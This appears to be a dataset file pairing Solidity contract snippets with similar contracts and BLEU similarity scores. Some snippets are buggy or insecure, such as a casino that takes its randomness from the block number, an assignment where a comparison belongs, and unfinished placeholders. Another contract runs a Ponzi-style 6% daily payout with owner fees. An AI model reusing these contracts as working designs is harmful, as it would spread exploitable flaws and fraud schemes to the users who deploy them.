sni,bleu,code
"contract Casino {


    uint minimumBet;
    uint totalBet;
    uint numberOfBets;
    uint maximumAmountsOfBets = 100;
    address[] players;

    struct Player {

        uint amountBet;
        uint numberSelected;
    }


    mapping(address => Player) playerInfo;


    address owner; 


    function Casino(uint _minimumBet) public{  
        

        owner = msg.sender;
        if(_minimumBet !=0) minimumBet = _minimumBet;

        }

        


    function bet(uint number) payable public {

        require(checkPlayerExists(msg.sender) );
        require(number >= 1 && number <= 10);
        require(msg.value >= minimumBet);


        playerInfo[msg.sender].amountBet = msg.value;
        playerInfo[msg.sender].numberSelected = number;
        numberOfBets += 1;
        players.push(msg.sender);
        totalBet += msg.value;

        if(numberOfBets >= maximumAmountsOfBets) generateNumberWinner();


        }



    function checkPlayerExists(address player) public view returns(bool) {

        for( uint i = 0 ; i < players.length; i++){
            if(players[i] == player) return true;
        }
        return false;
    }


    

    function generateNumberWinner() public{

        uint numberGenerated = block.number % 10 + 1; 

        distributePrizes(numberGenerated);
    }


    

    function distributePrizes(uint numberWinner) public {

        address[100] memory winners ; 

        uint count = 0; 

        for(uint i = 0; i < players.length ; i++) {
            address playerAddress = players[i];
            if(playerInfo[playerAddress].numberSelected == numberWinner){
                winners[count] = playerAddress;
                count ++;
            }
            delete playerInfo[playerAddress]; 


        }

        players.length = 0; 

        uint winnerEtherAmount = totalBet / winners.length; 

        for(uint j = 0; j < count; j++) {

            if(winners[j] !=address(0)) 
            winners[j].transfer(winnerEtherAmount);
        }


    }

    
    function() payable private{}



    function kill() private{ 

        if(msg.sender == owner)
            selfdestruct(owner);
    }
}",0.6517289724637416,"contract EasyInvest6 is Ownable

{   

    using SafeMath for uint;

    

    mapping (address => uint) public invested;

    mapping (address => uint) public lastInvest;

    address[] public investors;

    

    address private m1;

    address private m2;

    

    

    function getInvestorsCount() public view returns(uint) 

    {   

        return investors.length;

    }

    

    function () external payable 

    {   

        if(msg.value > 0) 

        {   

            require(msg.value >= 10 finney, ""require minimum 0.01 ETH""); 

            

            uint fee = msg.value.mul(7).div(100).add(msg.value.div(200)); 

            if(m1 != address(0)) m1.transfer(fee);

            if(m2 != address(0)) m2.transfer(fee);

        }

    

        payWithdraw(msg.sender);

        

        if (invested[msg.sender] == 0) 

        {

            investors.push(msg.sender);

        }

        

        lastInvest[msg.sender] = now;

        invested[msg.sender] += msg.value;

    }

    

    function getNumberOfPeriods(uint startTime, uint endTime) public pure returns (uint)

    {

        return endTime.sub(startTime).div(1 days);

    }

    

    function getWithdrawAmount(uint investedSum, uint numberOfPeriods) public pure returns (uint)

    {

        return investedSum.mul(6).div(100).mul(numberOfPeriods);

    }

    

    function payWithdraw(address to) internal

    {

        if (invested[to] != 0) 

        {

            uint numberOfPeriods = getNumberOfPeriods(lastInvest[to], now);

            uint amount = getWithdrawAmount(invested[to], numberOfPeriods);

            to.transfer(amount);

        }

    }

    

    function batchWithdraw(address[] to) onlyOwner public 

    {

        for(uint i = 0; i < to.length; i++)

        {

            payWithdraw(to[i]);

        }

    }

    

    function batchWithdraw(uint startIndex, uint length) onlyOwner public 

    {

        for(uint i = startIndex; i < length; i++)

        {

            payWithdraw(investors[i]);

        }

    }

    

    function setM1(address addr) onlyOwner public 

    {

        m1 = addr;

    }

    

    function setM2(address addr) onlyOwner public 

    {

        m2 = addr;

    }

}"
"contract Example {

    uint256 num;
    address parent;

    function Example(uint256 _num, address _parent) {
        num = _num;
        parent = _parent;
    }

    function createChild() {
        uint256 childNum = num + 1;
        Example child = new Example(childNum, this);
    }

    function getNumber() constant returns (uint256) {
        return num;
    }

    function getParentNumber() constant returns (uint256) {
        Example e = Example(parent);
        return e.getNumber();
    }

}",0.6130279626993026,"contract AthCrowdsaleInterface
{
    function investorsCount() public constant returns( uint256 );
    
    function investorsAddress( uint256 _i ) public constant returns( address );
    
    function investorsInfo( address _a ) public constant returns( uint256, uint256 );
    
    function investorsStockInfo( address _a ) public constant returns( uint256 );
    
    function getOwners(uint8) public constant returns( address );
}"
"contract TransferToken{
        function sendTheToken(address _from, address _to, uint256 _value)public returns(string) {
            address tokenContractAddress = <MyTokenaddress>
            MyToken token = MyToken (tokenContractAddress);
            bool sendSuccess = token.transferFrom(_from, _to, _value);
            if(sendSuccess=true) return 'success';
            else return 'Failure';
        }
    }",0.6248924233596456,"contract TokenERC20 {

	function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);

	function burnFrom(address _from, uint256 _value) public returns (bool success);

	mapping (address => mapping (address => uint256)) public allowance;

	mapping (address => uint256) public balanceOf;

}"
"contract StoreFactory {
  address[] private deployedStores;

  function createStore() public {
    deployedStores.push(new Store(msg.sender));
  }

  function getDeployedStores() public view returns (address[]){
    return deployedStores;
  }
}",0.6073997695747889,"contract DaoStakeStorage {

    mapping (address => uint256) public lockedDGDStake;



    function readLastModerator() public view returns (address);



    function readLastParticipant() public view returns (address);

}"
"contract calledContract {
    event callEvent(address sender, address origin, address from);
    function calledFunction() public {
        emit callEvent(msg.sender, tx.origin, this);
    }
}",0.6235813894928497,"contract ProxyEventsEmitter {
    function emitTransfer(address _from, address _to, uint _value);
    function emitApprove(address _from, address _spender, uint _value);
}"
"contract BankATM {

    enum Stages {
        ServingCustomer,
        Finished,
        Idle
    }

    address owner;

    mapping(address => uint256) balances;

    Stages public stage = Stages.ServingCustomer;

    constructor () payable public {
        owner = msg.sender;
    }

    modifier atStage(Stages _stage) {
        require(stage == _stage);
        _;
    }

    modifier transitionAfter() {
        _;
        nextStage();
    }

    modifier timedTransitions() {
        if (stage == Stages.ServingCustomer) {
            nextStage();
        }
        if (stage == Stages.Finished) {
            nextStage();
        }
        _;
    }

    function deposit(uint _amount) public payable timedTransitions atStage(Stages.ServingCustomer) {
        balances[msg.sender] += _amount;
    }

    function txFinished() public timedTransitions atStage(Stages.Finished) transitionAfter returns(uint) {
        return getBalance();
    }

    function idleNow() public view atStage(Stages.Idle) returns (uint) {
        return getBalance();
    }

    function getBalance() internal view returns (uint256){
        return balances[msg.sender];
    }

    function nextStage() internal {
        stage = Stages(uint(stage) + 1);
    }
}",0.6250039619097771,"contract MultiEthSender {



  uint256 constant private ethInWei = 10**18;

  mapping(address => uint256) private balance;

  address public owner;



  event Send(uint256 _amount, address indexed receiver);



  constructor() public payable {

    owner = msg.sender;

    balance[msg.sender] = msg.value;

  }



  function multiSendEth(uint256 amount, address[] list) public returns (bool) {

    uint256 amountInWei = amount * ethInWei;

    require(amountInWei * list.length <= balance[msg.sender], ""the contract balance is not enough"");

    for (uint256 i = 0; i < list.length; i++) {

      emit Send(amount, list[i]);

      uint256 res = balance[msg.sender];

      balance[msg.sender] = res - amountInWei;

      list[i].transfer(amountInWei);

    }

    return true;

  }



  function deposit() public payable returns (uint256) {

    balance[msg.sender] += msg.value;

    return balance[msg.sender];

  }



  function getBalance() public constant returns (uint256) {

      return balance[msg.sender];

  }



  function() public payable { }

}"
"contract F {
    uint public x;
    address addressE = 0x98789aD9797ad908097ad9870987DDD97897aD ;
    address public sender;

    function F() {
    }

    function setE(uint num) returns(bool) {
         x=num;
        return addressE.callcode('set(uint256)', num);
    }

    function getE() returns(uint) {
        return ?????????????;  
    }

}",0.6607822567792697,"contract Token {

  function transfer(address receiver, uint amount) public returns(bool);

  function transferFrom(address sender, address receiver, uint amount) public returns(bool);

  function balanceOf(address holder) public view returns(uint);

}"
"contract SignVerify {
    function recoverAddr(bytes32 msgHash, uint8 v, bytes32 r, bytes32 s) returns (address) {
        return ecrecover(msgHash, v, r, s);
    }

    function isSigned(address _addr, bytes32 msgHash, uint8 v, bytes32 r, bytes32 s) returns (bool) {
        return ecrecover(msgHash, v, r, s) == _addr;
    }
}",0.6109549301353883,"contract ENSReverseRegistrar {
    function claim(address _owner) public returns (bytes32);
    function claimWithResolver(address _owner, address _resolver) public returns (bytes32);
    function setName(string memory _name) public returns (bytes32);
    function node(address _addr) public pure returns (bytes32);
}"
"contract Bank {
    struct Client {
        uint deposit;
        bool active;
    }

    address owner;
    mapping(address => Client) public clientList;
    uint clientCounter;

    constructor() public payable {
        require(msg.value == 30 ether, ""Initial funding of 30 ether required for rewards"");
        
        owner = msg.sender;
        clientCounter = 0;
    }

    function enroll(address _addr) public {
        clientList[_addr].deposit = 0;
        clientList[_addr].active = true;
        clientCounter++;
    }

    function isClientActive(address _addr) public view returns(bool) {
        return clientList[_addr].active;
    }

    function getClientCounter() public view returns(uint) {
        return clientCounter;
    }

    
    function addDeposit() public payable {
        if (clientList[msg.sender].active != true) {
            revert(""the client's address does not exist"");
        } else {
            clientList[msg.sender].deposit += msg.value;
        }
    }

    
    function withdraw(uint amount) public payable {
        if (clientList[msg.sender].deposit < amount) {
            revert(""not enough deposit to make the withdraw"");
        } else {
            clientList[msg.sender].deposit -= amount;
            msg.sender.transfer(amount);
        }
    }

    
    function checkDeposit(address _addr) public view returns (uint) {
        return clientList[_addr].deposit;
    }

    
    function () public payable {
        if (!isClientActive(msg.sender)) {
            revert(""client does not exist"");
        } else {
            clientList[msg.sender].deposit += msg.value;
        }
    }
}",0.6462663080623835,"contract EventFactory{



    bool isStopped = false;



    address public owner = msg.sender;



    mapping (address => bool) registerSite;



    address[] public events;



    modifier onlyOwner() {

        require(msg.sender == owner);

        _;

    }



    function () public payable {

        revert();

    }



    function stopContract() onlyOwner public {

        isStopped = true;

    }



    function resumeContract() onlyOwner public {

        isStopped = false;

    }



    function emergencyWithdraw() onlyOwner public {

        require(isStopped == true);

        owner.transfer(address(this).balance);

    }



    function destroyContract() onlyOwner public {

        require(isStopped == true);

        selfdestruct(owner);

    }



    function createEvent(string _siteName, string _eventName, uint totalTickets, uint defaultPrice) public returns (address) {

        Event newEvent = new Event(msg.sender, _siteName, _eventName, totalTickets, defaultPrice);

        events.push(newEvent);

        return newEvent;

    }



    function getEvents() public view returns (address[]) {

        return events;

    }



    function registerEventSite(address siteAddr) onlyOwner public {

        registerSite[siteAddr] = true;

    }



    function deleteEventSite(address siteAddr) onlyOwner public {

        registerSite[siteAddr] = false;

    }



    function isValid(address _siteAddr) public view returns (bool){

        if(registerSite[_siteAddr])

            return registerSite[_siteAddr];

        else

            return false;

    }

}"
"contract Example {

    uint32 public value;

    event ValueSet(uint);

    function setValue(uint32 val) {
        value = val;
        ValueSet(val);
    }

}",0.6067181179901986,"contract PriceOracle
{
    
    function tokenValue(address token, uint amount)
        public
        view
        virtual
        returns (uint value);
}"
"contract Basic {
    uint public data;

    function increase() {
        data = BasicLib.add(data, 10);
    }    
}",0.6124568072864611,"contract Data {
    mapping(address => uint256) public CftBalanceOf;
       function Data() public {
            }
}"
"contract Abstract {
    function foobar();
}",0.696067526719917,"contract ARITokenAbstract {
    function unlock();
}"
"contract B {
    uint stateVar;
    function foo(Abstract someAddress){
        someAddress.foobar();
    }
    function bar(uint x) {
        stateVar = x;
    } 
}",0.6064836343749735,"contract Token {
	function balanceOf(address addr) returns(uint);
	function transfer(address to, uint amount) returns(bool);
}"
"contract DappTokenSale {
       address admin;
       DappToken public tokenContract;

      function DappTokeSale(DappToken _tokenContract) public {

          admin = msg.sender;
}
    }",0.6060237443780416,"contract TokenProvider is Ownable {

  MintableToken public token;

  function setToken(address newToken) public onlyOwner {
    token = MintableToken(newToken);
  }

}"
"contract RegisterContract {

    uint public contractWeight;

    mapping(bytes32=>string) public contracts;
    bytes32[] public myHashes;

    function addContract ( string jsonInput, bytes32 hashKey) public {
        contracts[hashKey] = jsonInput;
        myHashes.push(hashKey);
     }

    function addWeight (uint weight) public {
        contractWeight = weight;
    }

    function () payable public {
    }
}",0.6300681389019186,"contract ContractResolver {

  address public owner;

  bool public locked;

  function init_register_contract(bytes32 _key, address _contract_address) public returns (bool _success);

  function unregister_contract(bytes32 _key) public returns (bool _success);

  function get_contract(bytes32 _key) public constant returns (address _contract);

}"
